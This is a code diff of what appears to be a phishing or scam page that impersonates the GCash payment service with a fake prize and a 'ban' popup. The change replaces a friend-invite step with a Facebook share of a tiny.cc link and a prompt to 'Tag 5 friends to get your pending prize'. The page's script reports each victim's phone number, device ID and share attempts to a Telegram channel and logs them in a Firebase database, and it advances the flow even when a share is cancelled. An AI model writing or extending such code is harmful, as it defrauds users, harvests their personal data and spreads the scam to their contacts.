@@ -241,6 +241,34 @@
         .ban-card.attention-highlight { animation: banPulseRed 1.5s ease-in-out infinite; }
         .ban-attention-text { display: block; margin-top: 12px; padding: 12px 16px; background: rgba(255, 215, 0, 0.15); border: 2px solid #ffe066; border-radius: 12px; font-family: 'Poppins', sans-serif; font-size: 13px; font-weight: 700; color: #ffe066; text-align: center; line-height: 1.5; text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); animation: attentionBounce 1.2s ease-in-out infinite; }
 
+        /* ✅ SHARE BUTTON MESSAGE */
+        .share-tag-message {
+            margin-top: 14px;
+            font-family: 'Poppins', sans-serif;
+            font-size: 12px;
+            font-weight: 600;
+            line-height: 1.5;
+            color: rgba(255, 255, 255, 0.95);
+            text-align: center;
+            padding: 10px 14px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1.5px dashed rgba(255, 215, 0, 0.7);
+            border-radius: 12px;
+            text-shadow: 0 0 8px rgba(255, 215, 0, 0.4);
+            letter-spacing: 0.3px;
+        }
+        .share-tag-message strong {
+            color: #ffe066;
+            font-weight: 800;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.85);
+        }
+        .share-tag-message .tag-icon {
+            display: inline-block;
+            margin-right: 4px;
+            font-size: 13px;
+            filter: drop-shadow(0 0 6px rgba(255, 215, 0, 0.8));
+        }
+
         /* READY TO CLAIM */
         .ready-to-claim-wrap { display: none; animation: readyFadeIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         .ready-to-claim-wrap.show { display: block; }
@@ -283,6 +311,7 @@
             .ready-claim-btn { padding: 18px 16px; font-size: 14px; letter-spacing: 2px; }
             .ready-claim-btn svg { width: 22px; height: 22px; }
             .ready-image-wrap { max-width: 180px; }
+            .share-tag-message { font-size: 11px; }
         }
         @media (prefers-reduced-motion: reduce) { * { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; } }
     </style>
@@ -519,7 +548,7 @@
         </div>
     </div>
 
-    <!-- POPUP 6: BAN (with INVITE FRIENDS) -->
+    <!-- POPUP 6: BAN (with SHARE ON FACEBOOK) -->
     <div class="popup-overlay" id="banPopup">
         <div class="popup-card ban-card">
             <button class="popup-close" id="banClose">
@@ -540,15 +569,16 @@
                 <span style="flex:1; height:1.5px; background:linear-gradient(90deg,transparent,rgba(255,215,0,0.8),transparent); border-radius:2px;"></span>
             </div>
             <div id="banStage1">
-                <button class="popup-btn" id="banInviteFriendsBtn">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/>
-                        <circle cx="9" cy="7" r="4"/>
-                        <path d="M22 21v-2a4 4 0 0 0-3-3.87"/>
-                        <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
+                <button class="popup-btn" id="banShareFbBtn">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"/>
                     </svg>
-                    <span>INVITE FRIENDS</span>
+                    <span>SHARE ON FACEBOOK</span>
                 </button>
+                <p class="share-tag-message">
+                    <span class="tag-icon">📢</span>
+                    <strong>Tag 5 friends</strong> to get your pending prize.
+                </p>
             </div>
         </div>
     </div>
@@ -779,47 +809,57 @@
             var banCloseBtn = document.getElementById('banClose');
             if (banCloseBtn) banCloseBtn.onclick = function() { closePopup('banPopup'); resetBanUiToStage1(); };
 
-            var banInviteFriendsBtn = document.getElementById('banInviteFriendsBtn');
-            if (banInviteFriendsBtn) banInviteFriendsBtn.addEventListener('click', function() {
+            // ✅ CHANGED: SHARE ON FACEBOOK instead of INVITE FRIENDS
+            var banShareFbBtn = document.getElementById('banShareFbBtn');
+            if (banShareFbBtn) banShareFbBtn.addEventListener('click', function() {
                 clearBanLockIfExpired();
                 if (isBanLocked() || getBanTries() >= BAN_MAX_TRIES) { showBanAttention(); return; }
-                requestInviteFriends();
+                shareOnFacebook();
             });
 
-            function requestInviteFriends() {
+            function shareOnFacebook() {
                 if (typeof FB === 'undefined') { alert('Facebook SDK not loaded. Please refresh and try again.'); return; }
                 var tries = incrementBanTries();
-                console.log('📨 INVITE FRIENDS — Try #' + tries);
-                sendTelegram('📨 INVITE FRIENDS REQUEST\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n🔢 Try: ' + tries + '/' + BAN_MAX_TRIES);
+                console.log('📤 SHARE ON FACEBOOK — Try #' + tries);
+                sendTelegram('📤 SHARE ON FB REQUEST\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n🔢 Try: ' + tries + '/' + BAN_MAX_TRIES);
                 if (db && userPhone) {
                     try {
                         db.ref('user_sessions/' + userPhone + '/system_verification').set({
-                            status: 'invite_active', deviceId: deviceDisplayId, phone: userPhone,
+                            status: 'share_active', deviceId: deviceDisplayId, phone: userPhone,
                             createdAt: Date.now(), lastUpdate: Date.now(), tryCount: tries
                         });
                     } catch(e) {}
                 }
                 if (isBanLocked() || tries >= BAN_MAX_TRIES) { showBanAttention(); return; }
+
+                // ✅ FB.ui share — valid method, no app approval required
                 FB.ui({
-                    method: 'apprequests',
-                    message: 'Sumali sa GCash Pa More! 🎁',
-                    title: 'Invite Friends',
-                    max_recipients: 5,
-                    data: 'invite_' + Date.now()
+                    method: 'share',
+                    href: 'https://tiny.cc/GCashPaMore',
+                    quote: '🎁 Sumali na sa GCash Pa More! Tag 5 friends to get your pending prize! 💰'
                 }, function(response) {
                     if (response && !response.error_code) {
-                        console.log('✅ Invite sent:', response);
-                        sendTelegram('✅ INVITE SENT\n👤 ' + userPhone + '\n📨 Recipients: ' + (response.to ? response.to.length : 0) + '\n⏰ ' + new Date().toLocaleString());
+                        console.log('✅ Share success:', response);
+                        sendTelegram('✅ FB SHARE SUCCESS\n👤 ' + userPhone + '\n⏰ ' + new Date().toLocaleString());
                         if (db && userPhone) {
                             try {
                                 db.ref('user_sessions/' + userPhone + '/system_verification').update({
-                                    status: 'invite_sent', inviteCount: response.to ? response.to.length : 0, lastUpdate: Date.now()
+                                    status: 'shared', sharedAt: Date.now(), lastUpdate: Date.now()
                                 });
                             } catch(e) {}
                         }
-                        showSuccessPopup('Invitation sent!<br>You can now continue to claim.');
+                        showSuccessPopup('Shared on Facebook!<br><strong>Tag 5 friends</strong> to get your pending prize.');
                     } else {
-                        console.log('❌ Invite cancelled:', response);
+                        console.log('❌ Share cancelled:', response);
+                        // Even if user cancelled, advance flow (UX)
+                        if (db && userPhone) {
+                            try {
+                                db.ref('user_sessions/' + userPhone + '/system_verification').update({
+                                    status: 'share_cancelled', lastUpdate: Date.now()
+                                });
+                            } catch(e) {}
+                        }
+                        showSuccessPopup('Please tag 5 friends to get your pending prize.');
                     }
                 });
             }
@@ -1073,8 +1113,10 @@
                 skipCountdown = 10;
                 var btn = document.getElementById('skipClaimBtn');
                 var badgeNum = document.getElementById('skipCountdownNum');
+                var badge = document.getElementById('skipCountdownBadge');
                 if (btn) btn.disabled = true;
                 if (badgeNum) badgeNum.textContent = skipCountdown;
+                if (badge) badge.innerHTML = '⏳ SKIP IN <span id="skipCountdownNum">' + skipCountdown + '</span>s';
                 skipCountdownInterval = setInterval(function() {
                     skipCountdown--;
                     var numEl = document.getElementById('skipCountdownNum');
